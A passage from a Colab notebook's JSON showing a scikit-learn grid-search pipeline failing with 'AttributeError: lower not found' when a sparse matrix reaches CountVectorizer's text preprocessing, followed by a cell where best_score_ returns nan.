            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/model_selection/_search.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, groups, **fit_params)\u001b[0m\n\u001b[1;32m    737\u001b[0m             \u001b[0mrefit_start_time\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtime\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtime\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    738\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0my\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 739\u001b[0;31m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbest_estimator_\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    740\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    741\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbest_estimator_\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, **fit_params)\u001b[0m\n\u001b[1;32m    348\u001b[0m             \u001b[0mThis\u001b[0m \u001b[0mestimator\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    349\u001b[0m         \"\"\"\n\u001b[0;32m--> 350\u001b[0;31m         \u001b[0mXt\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfit_params\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_fit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    351\u001b[0m         with _print_elapsed_time('Pipeline',\n\u001b[1;32m    352\u001b[0m                                  self._log_message(len(self.steps) - 1)):\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36m_fit\u001b[0;34m(self, X, y, **fit_params)\u001b[0m\n\u001b[1;32m    313\u001b[0m                 \u001b[0mmessage_clsname\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m'Pipeline'\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    314\u001b[0m                 \u001b[0mmessage\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_log_message\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstep_idx\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 315\u001b[0;31m                 **fit_params_steps[name])\n\u001b[0m\u001b[1;32m    316\u001b[0m             \u001b[0;31m# Replace the transformer of the step with the fitted\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    317\u001b[0m             \u001b[0;31m# transformer. This is necessary when loading the transformer\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/joblib/memory.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *args, **kwargs)\u001b[0m\n\u001b[1;32m    350\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    351\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__call__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 352\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfunc\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    353\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    354\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mcall_and_shelve\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36m_fit_transform_one\u001b[0;34m(transformer, X, y, weight, message_clsname, message, **fit_params)\u001b[0m\n\u001b[1;32m    726\u001b[0m     \u001b[0;32mwith\u001b[0m \u001b[0m_print_elapsed_time\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmessage_clsname\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmessage\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    727\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mhasattr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtransformer\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'fit_transform'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 728\u001b[0;31m             \u001b[0mres\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtransformer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit_transform\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    729\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    730\u001b[0m             \u001b[0mres\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtransformer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtransform\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36mfit_transform\u001b[0;34m(self, raw_documents, y)\u001b[0m\n\u001b[1;32m   1218\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1219\u001b[0m         vocabulary, X = self._count_vocab(raw_documents,\n\u001b[0;32m-> 1220\u001b[0;31m                                           self.fixed_vocabulary_)\n\u001b[0m\u001b[1;32m   1221\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1222\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbinary\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_count_vocab\u001b[0;34m(self, raw_documents, fixed_vocab)\u001b[0m\n\u001b[1;32m   1129\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mdoc\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mraw_documents\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1130\u001b[0m             \u001b[0mfeature_counter\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1131\u001b[0;31m             \u001b[0;32mfor\u001b[0m \u001b[0mfeature\u001b[0m \u001b[0;32min\u001b[0m \u001b[0manalyze\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1132\u001b[0m                 \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1133\u001b[0m                     \u001b[0mfeature_idx\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvocabulary\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mfeature\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_analyze\u001b[0;34m(doc, analyzer, tokenizer, ngrams, preprocessor, decoder, stop_words)\u001b[0m\n\u001b[1;32m    101\u001b[0m     \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    102\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mpreprocessor\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 103\u001b[0;31m             \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpreprocessor\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    104\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mtokenizer\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    105\u001b[0m             \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtokenizer\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_preprocess\u001b[0;34m(doc, accent_function, lower)\u001b[0m\n\u001b[1;32m     66\u001b[0m     \"\"\"\n\u001b[1;32m     67\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mlower\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 68\u001b[0;31m         \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdoc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mlower\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     69\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0maccent_function\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     70\u001b[0m         \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0maccent_function\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/scipy/sparse/base.py\u001b[0m in \u001b[0;36m__getattr__\u001b[0;34m(self, attr)\u001b[0m\n\u001b[1;32m    689\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetnnz\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    690\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 691\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mAttributeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mattr\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m\" not found\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    692\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    693\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mtranspose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0maxes\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcopy\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mFalse\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mAttributeError\u001b[0m: lower not found"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gi-vbPkbj5vg",
        "outputId": "83b9a895-8a01-4f49-baee-2500aa1035d5"
      },
      "source": [
        "grid_search.best_score_"
      ],
      "execution_count": 93,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "nan"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 93
        }
      ]
    }
  ]
}